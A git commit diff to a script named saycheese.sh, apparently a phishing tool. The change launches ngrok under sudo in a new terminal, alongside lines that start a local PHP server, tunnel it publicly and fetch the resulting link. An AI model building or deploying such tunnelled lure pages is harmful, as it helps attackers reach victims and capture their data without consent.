8e5f5201ba0fbd04c5cb5b7fcc8a83ffb1884365
Animesh979 <84859063+Animesh979@users.noreply.github.com>
2022-02-22 00:55:57 +0530

    Update saycheese.sh

--- saycheese.sh
+++ saycheese.sh
@@ -168,7 +168,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+sudo gnome-terminal -x ./ngrok http 3333
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
